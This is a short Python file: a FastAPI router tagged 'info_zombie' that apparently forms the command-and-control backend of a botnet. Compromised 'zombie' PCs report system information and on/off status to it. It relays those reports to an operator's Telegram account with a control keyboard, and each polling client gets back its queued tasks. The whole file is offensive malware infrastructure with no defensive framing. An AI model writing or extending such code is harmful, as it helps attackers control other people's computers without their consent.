from core.loader import app, tasks, bot, config
from bot.utils.text import control_text
from bot.keyb import control as control_keyboard_tg
from .models import InfoPcForm, RequestPollingForm

from type import TypeInfo
from fastapi import APIRouter


router_info=APIRouter(prefix='/info', tags=['info_zombie'])

@router_info.post('/pc')
async def pc_info(form: InfoPcForm):
    await bot.send_message(chat_id=config.admin_id_tg, text=await control_text(form), reply_markup=await control_keyboard_tg.control_main(form.uuid)
    )

@router_info.post('/polling')
async def polling(form: RequestPollingForm):
    
    if TypeInfo.off_pc == form.typePolling:
        await bot.send_message(chat_id=config.admin_id_tg, text=f'PC {form.zombie} turned off')
    if TypeInfo.on_pc == form.typePolling:
        await bot.send_message(chat_id=config.admin_id_tg, text=f'PC {form.zombie} is working')

    return {'tasks' : await tasks.get_tasks(form.zombie)}
        




